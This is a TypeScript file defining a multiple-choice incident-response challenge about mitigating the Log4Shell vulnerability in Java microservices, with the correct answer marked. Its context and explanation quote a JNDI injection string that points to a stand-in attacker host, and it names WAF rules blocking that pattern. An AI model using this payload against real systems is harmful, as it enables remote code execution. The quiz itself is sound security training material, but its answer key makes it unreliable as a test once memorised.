import type { Challenge } from '../types';

// ─── ENG-WAR-044 ─────────────────────────────────────────────────────────────────
// Edit the object below to update this challenge.
// Run `npx next build` after saving to confirm no TypeScript errors.

const challenge: Challenge = {
  id: 'ENG-WAR-044',
    type: 'War Room',
      badgeClass: 'badge-war',
        title: 'Log4Shell Zero-Day in Production JVM Services',
          companies: ['Apple', 'Amazon', 'Minecraft'],
            timeEst: '~30 min',
              level: 'Senior',
                status: 'Not Started',
                  realWorldContext: `The Log4Shell vulnerability (CVE-2021-44228) disclosed in December 2021 affected virtually every Java application using Log4j 2.x. Attackers could achieve Remote Code Execution by sending a malicious string like \${jndi: ldap://attacker.com/a} in any logged field (User-Agent, username, etc.). Cloudflare saw exploitation attempts within hours of disclosure. Amazon, Apple, Minecraft, and thousands of others were affected.`,
  desc: `It's December 10, 2021. A critical 0-day (Log4Shell) is publicly disclosed affecting Log4j 2.x. Your company runs 40+ Java microservices using Spring Boot (which bundles Log4j). Scanners show exploitation attempts hitting your login endpoint's User-Agent field. You need to: identify which services are affected, mitigate the vulnerability, and patch — all before attackers successfully exploit your services.`,
    solution: `Immediate mitigation (before patching, which takes time): set the JVM system property log4j2.formatMsgNoLookups=true or set the environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS=true in all Java services. This disables the JNDI lookup feature without requiring a code change or redeploy of the JAR. Then: audit all services for Log4j 2.x usage (check pom.xml/build.gradle), patch to Log4j 2.17.1+, and add WAF rules to block \${jndi: patterns.`,
    explanation: `Log4Shell attack vector: when Log4j logs a string containing \${jndi: ldap://attacker.com/x}, it makes an outbound LDAP request to the attacker's server, which responds with Java class bytecode that executes on your JVM. Full mitigation chain: (1) Immediate: LOG4J_FORMAT_MSG_NO_LOOKUPS=true (env var, no restart needed on many platforms). (2) Short-term: WAF rules blocking \${jndi: in all inputs. (3) Patch: upgrade to Log4j 2.17.1+ (earlier 2.16.0 patch was incomplete). (4) Audit: log4j-detector tool scans JARs including nested JARs in fat JARs.`,
    options: [
      { label: 'A', title: 'Block all outbound HTTP/LDAP traffic from servers immediately', sub: 'iptables -A OUTPUT -p tcp --dport 389 -j DROP (LDAP)', isCorrect: false },
      { label: 'B', title: 'Patch all 40+ services to Log4j 2.17.1 and redeploy immediately', sub: 'Update pom.xml: log4j.version=2.17.1; mvn package; deploy all', isCorrect: false },
      { label: 'C', title: 'Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true immediately; audit; patch to 2.17.1; add WAF rules', sub: 'Env var mitigation NOW → scan all JARs → patch → WAF rule blocking ${jndi:', isCorrect: true },
      { label: 'D', title: 'Rewrite all Java services in Python to eliminate Log4j dependency', sub: 'Immediate language migration to avoid JVM vulnerability', isCorrect: false },
    ]
  };

export default challenge;
